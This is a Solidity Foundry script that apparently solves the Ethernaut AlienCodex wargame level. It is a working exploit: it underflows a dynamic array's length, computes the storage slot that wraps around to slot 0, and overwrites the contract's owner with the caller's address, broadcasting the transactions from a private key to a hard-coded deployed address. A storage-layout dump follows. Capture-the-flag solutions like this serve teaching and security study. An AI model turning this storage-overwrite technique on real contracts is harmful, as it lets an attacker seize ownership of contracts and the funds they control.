// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
//research: https://docs.soliditylang.org/en/v0.6.0/060-breaking-changes.html
//research: https://medium.com/@fifiteen82726/solidity-attack-array-underflow-1dc67163948a
interface AlienCodex {
    function owner() external view returns (address);
    function makeContact() external;
    function record(bytes32 _content) external;
    function retract() external;
    function revise(uint i, bytes32 _content) external;
}
contract AlienCodexTest is Test {
    address constant AlienCodexAddress = 0x8f1a0420f2FD60d500F6769D03d63590a7cA5D59;
    function test() external {
        address EOA = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AlienCodex alienCodex = AlienCodex(AlienCodexAddress);
        alienCodex.makeContact();
        alienCodex.retract();
        // let's try to revise the owner
        // now i will calculate the position of the array in the storage
        // inspecting storage using `forge inspect AlienCodex storage`
        // we can see that the array is stored in slot 1
        // and the owner is stored in slot 0, together with the bool
        // so we need to calculate the position of the array in the storage
        bytes32 arrayPosition = keccak256(abi.encodePacked(abi.encode(1)));
        // and we need to subtract it from max uint, so that we can get the owner slot in the underFlowed array
        uint slot = 2**256 - 1 - uint(arrayPosition) + 1;
        // let's try to revise the owner
        alienCodex.revise(slot, bytes32(uint256(uint160(EOA))));
        console2.log(alienCodex.owner());
        vm.stopBroadcast();
    }
}


/// storage layout

// {
//   "storage": [
//     {
//       "astId": 30,
//       "contract": "src/AlienCodex.sol:AlienCodex",
//       "label": "_owner",
//       "offset": 0,
//       "slot": "0",
//       "type": "t_address"
//     },
//     {
//       "astId": 148,
//       "contract": "src/AlienCodex.sol:AlienCodex",
//       "label": "contact",
//       "offset": 20,
//       "slot": "0",
//       "type": "t_bool"
//     },
//     {
//       "astId": 151,
//       "contract": "src/AlienCodex.sol:AlienCodex",
//       "label": "codex",
//       "offset": 0,
//       "slot": "1",
//       "type": "t_array(t_bytes32)dyn_storage"
//     }
//   ],
//   "types": {
//     "t_address": {
//       "encoding": "inplace",
//       "label": "address",
//       "numberOfBytes": "20"
//     },
//     "t_array(t_bytes32)dyn_storage": {
//       "encoding": "dynamic_array",
//       "label": "bytes32[]",
//       "numberOfBytes": "32",
//       "base": "t_bytes32"
//     },
//     "t_bool": {
//       "encoding": "inplace",
//       "label": "bool",
//       "numberOfBytes": "1"
//     },
//     "t_bytes32": {
//       "encoding": "inplace",
//       "label": "bytes32",
//       "numberOfBytes": "32"
//     }
//   }
// }
